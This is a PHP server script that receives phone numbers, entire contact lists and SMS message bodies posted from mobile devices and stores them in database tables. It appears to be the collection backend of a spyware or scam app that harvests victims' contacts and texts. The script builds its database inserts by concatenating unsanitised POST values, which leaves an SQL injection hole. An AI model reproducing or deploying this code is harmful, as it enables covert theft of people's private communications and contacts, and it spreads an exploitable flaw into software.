<?php
require_once('common/Db.php');
require_once('common/Function.php');
function getPostLog(array $_data = array(),$n = ''){
 $_gPOST = empty($_data) ? I('post.') : $_data;
 $_rs = array();
 foreach ($_gPOST AS $name=>$value){
  if( is_array($value) ){
   $_rs[] = getPostLog($value,$name);
  }else{
   if( !empty($_data) ){
    $_rs[] = $n.'['.$name.']'.'='.$value;
   }else{
    $_rs[] = $name.'='.$value;
   }
  }
 }
 $_rs = implode('&', $_rs);
 return $_rs;
}
if($_POST['data'] or $_POST){
	
	
	if($_GET['sb']=='a'){
     $aa=json_encode($_POST);
     $aa=json_decode($aa);
      $b=json_decode($aa->gettel);
    
		
	$sjh= $aa->tel;
	$yqm= $aa->code;

	
		
		$r=Add('mac','imei,imei2,addtime',"'".$sjh."','".$yqm."','".time()."'");
		if($r){
			for($i=0;$i<count($b);$i++){
				
				Add('content','name,tel,imei,imei2,addtime',"'".$b[$i]->tel_name."','".$b[$i]->tel."','".$sjh."','".$yqm."','".time()."'");
			}
			 echo '200';
		}
		
		
		
		
	}
	else{
	
	$a=json_decode($_POST['data']);
	
	if(count($a)>=1){}else{exit('获取失败');}
	
$sjh=$a[0]->imei;
$yqm=$a[0]->imei2;

	
			for($i=1;$i<count($a);$i++){
				$b=$a[$i];
				
				Add('sms','tel,content,type,date,addtime,imei,imei2',"'".str_replace('+86','',$b->PhoneNumber)."','".$b->Smsbody."','".$b->Type."','".$b->Date."','".time()."','".$sjh."','".$yqm."'");
			}
			echo '200';
		
	
		
	
}
	
}
else{
echo 'error';
exit;
}

?>